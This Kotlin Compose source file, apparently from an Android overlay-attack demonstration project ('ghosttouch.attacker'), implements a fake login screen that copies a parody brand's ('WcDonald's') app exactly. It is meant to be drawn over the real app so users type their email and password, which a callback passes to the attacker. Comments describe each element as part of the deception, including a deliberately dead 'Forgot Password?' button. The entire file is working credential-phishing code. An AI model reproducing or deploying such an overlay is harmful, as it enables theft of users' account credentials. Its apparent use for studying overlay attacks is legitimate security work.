package com.ghosttouch.attacker.overlay

import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.text.KeyboardOptions
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.Email
import androidx.compose.material.icons.filled.Lock
import androidx.compose.material.icons.filled.Visibility
import androidx.compose.material.icons.filled.VisibilityOff
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.input.KeyboardType
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.text.input.VisualTransformation
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp

/**
 * Fake login overlay that mimics the WcDonald's login screen.
 *
 * ## The deception
 * This overlay is designed to look identical to the real WcDonald's login screen.
 * It matches the same:
 * - Color scheme (red/yellow)
 * - Layout and spacing
 * - Font styles and sizes
 * - Logo placement
 * - Button styling
 *
 * When displayed on top of the real app, the user sees what appears to be a
 * legitimate login prompt and enters their credentials, which are captured
 * by the attacker.
 *
 * @param onCredentialsCaptured Callback with email and password when "Sign In" is pressed.
 * @param onDismiss Callback when the overlay should be removed.
 */
@Composable
fun FakeLoginOverlay(
    onCredentialsCaptured: (email: String, password: String) -> Unit,
    onDismiss: () -> Unit
) {
    // WcDonald's brand colors (must match the real app exactly)
    val wcRed = Color(0xFFDA291C)
    val wcYellow = Color(0xFFFFC72C)
    val wcWhite = Color(0xFFFFFFFF)
    val wcBackground = Color(0xFFFAFAFA)
    val wcGray = Color(0xFF757575)

    var email by remember { mutableStateOf("") }
    var password by remember { mutableStateOf("") }
    var passwordVisible by remember { mutableStateOf(false) }
    var isLoading by remember { mutableStateOf(false) }

    // Fullscreen background matching WcDonald's theme
    Box(
        modifier = Modifier
            .fillMaxSize()
            .background(wcBackground)
    ) {
        Column(
            modifier = Modifier.fillMaxSize()
        ) {
            // Fake top app bar — matches WcDonald's exactly
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .statusBarsPadding()
                    .height(64.dp)
                    .background(wcRed),
                contentAlignment = Alignment.CenterStart
            ) {
                Text(
                    "Sign In",
                    color = wcWhite,
                    fontSize = 20.sp,
                    fontWeight = FontWeight.Normal,
                    modifier = Modifier.padding(start = 56.dp)
                )
            }

            // Form content — mirrors real LoginScreen layout
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(24.dp),
                horizontalAlignment = Alignment.CenterHorizontally,
                verticalArrangement = Arrangement.spacedBy(16.dp)
            ) {
                Spacer(modifier = Modifier.height(24.dp))

                // Logo — identical to real app
                Box(
                    modifier = Modifier
                        .size(80.dp)
                        .background(wcYellow, RoundedCornerShape(40.dp)),
                    contentAlignment = Alignment.Center
                ) {
                    Text(
                        "W",
                        fontSize = 40.sp,
                        fontWeight = FontWeight.Bold,
                        color = wcRed
                    )
                }

                Text(
                    "Welcome Back",
                    fontSize = 24.sp,
                    fontWeight = FontWeight.Bold,
                    color = Color.Black
                )

                Text(
                    "Sign in to your WcDonald's account",
                    fontSize = 14.sp,
                    color = wcGray
                )

                Spacer(modifier = Modifier.height(16.dp))

                // Email field — captures typed email
                OutlinedTextField(
                    value = email,
                    onValueChange = { email = it },
                    label = { Text("Email") },
                    placeholder = { Text("your@email.com") },
                    leadingIcon = {
                        Icon(Icons.Default.Email, contentDescription = null)
                    },
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Email),
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                // Password field — captures typed password
                OutlinedTextField(
                    value = password,
                    onValueChange = { password = it },
                    label = { Text("Password") },
                    leadingIcon = {
                        Icon(Icons.Default.Lock, contentDescription = null)
                    },
                    trailingIcon = {
                        IconButton(onClick = { passwordVisible = !passwordVisible }) {
                            Icon(
                                if (passwordVisible) Icons.Default.Visibility
                                else Icons.Default.VisibilityOff,
                                contentDescription = "Toggle password visibility"
                            )
                        }
                    },
                    visualTransformation = if (passwordVisible) VisualTransformation.None
                    else PasswordVisualTransformation(),
                    keyboardOptions = KeyboardOptions(keyboardType = KeyboardType.Password),
                    singleLine = true,
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(12.dp)
                )

                Spacer(modifier = Modifier.height(8.dp))

                // Fake sign-in button — triggers credential capture
                Button(
                    onClick = {
                        isLoading = true
                        // Capture the entered credentials
                        onCredentialsCaptured(email, password)
                        // Brief loading animation then dismiss
                        onDismiss()
                    },
                    modifier = Modifier
                        .fillMaxWidth()
                        .height(52.dp),
                    shape = RoundedCornerShape(12.dp),
                    colors = ButtonDefaults.buttonColors(containerColor = wcRed),
                    enabled = email.isNotBlank() && password.isNotBlank() && !isLoading
                ) {
                    if (isLoading) {
                        CircularProgressIndicator(
                            modifier = Modifier.size(24.dp),
                            color = wcWhite
                        )
                    } else {
                        Text(
                            "Sign In",
                            fontSize = 16.sp,
                            fontWeight = FontWeight.SemiBold
                        )
                    }
                }

                TextButton(onClick = { /* Non-functional — part of the deception */ }) {
                    Text("Forgot Password?", color = wcRed)
                }
            }
        }
    }
}
